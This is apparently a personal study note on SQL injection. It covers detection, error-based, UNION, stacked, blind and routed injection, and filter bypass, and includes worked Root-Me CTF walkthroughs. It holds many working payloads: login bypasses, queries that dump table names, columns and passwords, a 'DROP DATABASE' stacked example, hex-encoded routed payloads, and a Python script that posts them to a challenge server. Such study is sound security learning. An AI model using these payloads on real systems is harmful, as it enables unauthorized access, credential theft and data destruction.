# sqlInjection


finding a functionality that at some point interacts with a database; then
trying to get it to do other stuff than intended.

# EXAMINE

https://portswigger.net/web-security/sql-injection/cheat-sheet

send these, and look for errors, differences or other anomalies in the response:
* `'` 
- payloads that could trigger a delay.
- boolean conditions: `OR 1=2` or `OR 1=1`
- payloads to trigger out-of-band network interactions.

* fuzzing: send multiple sqli payloads and  monitor the responses for possible
code injections.

so you will first identify an entry point to the database, then how you could exploit it.
# types:

maybe most different on the feedback method.

## classic:


if an application is vulnerable to SQL injection, and the results are returned
within the application's responses.

1. error based: triggers error in the database to collect info:

  - `CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE);`
  
  * getting hidden data:
    * sql comments: `--` => `''+OR+1=1--` [[sqli examples#sqli in WHERE clause| in WHERE clause to get hidden data]].
	
  * changing application logic:
    * mysql payload: `uname=' or 1=1;` or perhaps `#` to [[sqli examples#allowing login bypass | login bypass]].
	
2. [[UNION based SQLi]] : concatenate queries to get data from other tables in the databse.


3. stacked queries

* In SQL, multiple statements, separated by semicolon (;) can be
  included in one statement string.

```sql
  SELECT Name, Salary, SSN
  FROM employee
  WHERE eid= 'a'; DROP DATABASE dbtest;
```
  
* encode stuff

## [[blind SQLi]]

##  stored sqli (second order):

sometimes the payload might be kept in the database and called later.


# get more info of the database

infer the database version and type based on the payloads that work.

https://portswigger.net/web-security/sql-injection/cheat-sheet

[[UNION based SQLi#get *table information* using UNION based attacks| get table information using UNION based attacks]]
# defenses used against SQLi

  * prepared statements: so that the malicious part doesn't compile and
    treated as an string rather than an executable.
  * allow list
  * sanitize and escape user input

# bypass blocks


use none obvious inputs.

you can do injection attacks using any user controllable input that is
processed as SQL query.

some websites take input in XML or JSON to query the database.

solution:

these formats may have some ways to bypass the protection against sql attacks.
you could do html hex encode to send a request. (using an XML escape sequence?
what is this?)

obfuscation attacks are useful to bypass WAFs and other defenses.

White space & comment obfuscation: Using `/**/`, `--+`, tabs, etc., to bypass filters.

* the filter looks for keywords: try encoding or escaping characters

`SELECT` => `&#x53;ELECT`


# routed SQLi

the injectable query doesn't reflect, but the result is passed to another query.
you could use UNION SELECT but nothing is appended to the result.

`$query = "SELECT id, sec_code FROM users WHERE id='1' and false union select 1,2--"`

`$result = mysqli_query($conn, $query);

$row = mysqli_fetch_array($result, MYSQLI_ASSOC);
$row2 = mysqli_fetch_array($result, MYSQLI_ASSOC);

print_r($row);
print_r($row2);

$query2 = "SELECT username FROM users WHERE sec_code='" . $row['sec_code'] . "'";`

`mysqli_fetch_array` gets one row at a time.

so we could use `and false`: results in the first query not being considered at all and using
just returning one row, containing the second values.

if there isn't a `sec_code` = 2 in the `users` table we won't get an output.

whatever we put in place of `2` in the first query will be injected into the second one.

Chaining query1 to: we will first *encode* the query to HEX, then add `0x` in the
payload so that it is interpreted correctly by MySQL.

`$query = "SELECT id, sec_code FROM users WHERE id='1' and false union select 1,0x27206f72207472756523--";`

which in the `print_r($row)` is interpreted like:

`(
    [id] => 1
    [sec_code] => ' or true#
)`

so with this, the second query will return.

the next step:
`$query = "SELECT id, sec_code FROM users WHERE id='1' and false union select 1,0x2720756e696f6e2073656c656374203223--";1`
``
(
    [id] => 1
    [sec_code] => ' union select 2#
)
``
so we will finally have `2` reflected in the output.

## Root-me routed

testing:

`login=admin' order by 1-- ` attack detected
`login=admin' union select NULL--` 
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
`login=admin' union select 1-- `
[+] Requested login: admin' union select 1--
[+] Found ID: 3
[+] Email: admin@sqli_me.com
`login=admin' union select NULL-- `
[+] Requested login: admin' union select NULL--
[+] Found ID: 3
[+] Email: admin@sqli_me.com

this means the payload will be reflected.

Another number or NULL, results in "attack detected".

`and false` too.

you should consider that you have to *put a `" "` or `+` character after comment in MySQL*.

to check how many columns the second query returns using HEXed`' union select order by 2-- `:
`login=' union select 0x27206f726465722062792032202d2d20-- `
[+] Requested login: ' union select 0x27206f726465722062792032202d2d20--
[+] Found ID:
[+] Email:
`login=' union select 0x27206f726465722062792033202d2d20-- ` by 3--
Unknown column '3' in 'order clause'

* not sending "admin", seems to make a difference on receiving the error,
  something like what `and false` did. the first query wouldn't return so the
  second one would. so I think I should have entered it in the first place.

get the *database version* using `'UNION SELECT @@version ,NUll-- `:
`' union select 0x27554e494f4e2053454c45435420404076657273696f6e202c4e556c6c2d2d20-- `
[+] Requested login: ...
[+] Found ID: 8.0.36
[+] Email:

get *table name* `'UNION SELECT 1,table_name FROM information_schema.tables-- ` (cleaner to be like this, compared to above request):
`login=' union select 0x27554e494f4e2053454c45435420312c7461626c655f6e616d652046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c65732d2d20-- `
[+] Requested login: ... 
[+] Found ID: 1
[+] Email: users

to get every column, we should get one row at a time, so `limit 0,1` and others:
`' union select 1,column_name from information_schema.columns where table_name='users' limit 2,1-- `
[+] Requested login: ...
[+] Found ID: 1
[+] Email: password

and then `' union select id, password from users where id=3 -- ` to get the passowrd.

* another solutions instead of `limit`: 
  `' union select ' union select 1,concat(login,password) from users -- - -- -`
the end dashed are just for spaces.

and instead of manually trying all these:
`
import binascii
#y=binascii.hexlify(b'asdf')

origin=b"3 union select table_name from information_schema.tables limit 1 offset 1"
origin=b"4' union select 1,table_name from information_schema.tables where table_schema = database() limit 0,1 -- "
origin=b"4' union select 1,column_name from information_schema.columns where table_name='users' limit 2,1 -- "
origin=b"4' union select id, password from users where id=3 limit 0,1-- "
payload=str(binascii.hexlify(origin),'ascii')
datas={"login":f"' union select 0x{payload} -- "}
re=requests.post(url="http://challenge01.root-me.org/web-serveur/ch49/index.php?action=search",data=datas,verify=False)

print(re.text)
`

## routed

a really interesting part of the solution: `-3' UNION SELECT SLEEP(6),1 --`
it seems it used `-3` to falsify the first query.

Interesting stuff `' UNIon SELect 1,(SELect GROup_CONcat(CONcat(id,0x3a,login,0x3a,password,0x3a,email) SEParator '<br>') FROm users)-- - `

## Root-Me authentication v 0.01

login=' OR 1=1 # &password=2

SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &quot;#&quot; in <b>/challenge/web-serveur/ch9/index.php</b> on line <b>38</b><br />

login=' OR 1=1 -- &password=2

```
Welcome back user1 !</h2><h3>Your informations :</h3><p>- username : <input type="text" value="user1" disabled /><br/>- password : <input type="password" value="TYsgv75zgtq" disabled /></p>


login='OR 3=3  &password=5

<b>Warning</b>:  SQLite3::query(): Unable to prepare statement: 1, near &quot;' and password='&quot;: syntax error in <b>/challenge/web-serveur/ch9/index.php</b> on line <b>38</b><br />
```

near "' and password='": syntax error


### why are we able to login as `user1`?

login=' ORDER BY 3-- &password=5

<b>Warning</b>:  SQLite3::query(): Unable to prepare statement: 1, 1st ORDER BY term out of range - should be between 1 and 2 in <b>/challenge/web-serveur/ch9/index.php</b> on line <b>38</b><br />
1st ORDER BY term out of range - should be between 1 and 2

login=user1'UNION SELECT NULL,NULL limit 0,1--&password=5

this again returns NULL for the credentials, (with or without `limit 0,1`.
but with `limit 2,1` we will have the credentials for `user1`.

and then:

`login=admin'UNION SELECT NULL,NULL limit 1,2-- &password=5`

returns `admin`'s creds.

in all of these an empty password returns an error.

#### Other payloads:

* you can use `;` to end the query.

admin';%00

' OR '2'='2' AND username NOT LIKE '%user1%

admin' --

' or 1=1;
' or ( 1=1 and username='admin');

admin'or '1'='0' --

' or 'x'='x' order by 1 asc --

`
aa' UNION SELECT count(*), users.password FROM users; --
Then, i’ve just tried all 3 passwords:

aa' UNION SELECT users.password, users.password FROM users LIMIT 1; --
aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 1; --
aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 2; --
if you guessed the username column, this will do:

aa' UNION SELECT users.password, users.password FROM users WHERE username='admin';--
`

`admin'; select * from users; -- `

login:foobar'&password:' OR username='admin

# tips

if you enter `'` in a search field and get it back in the result, it has been escaped and
isn't considered as a special character.

perl, quote(), array injection [[natas#natas30]]
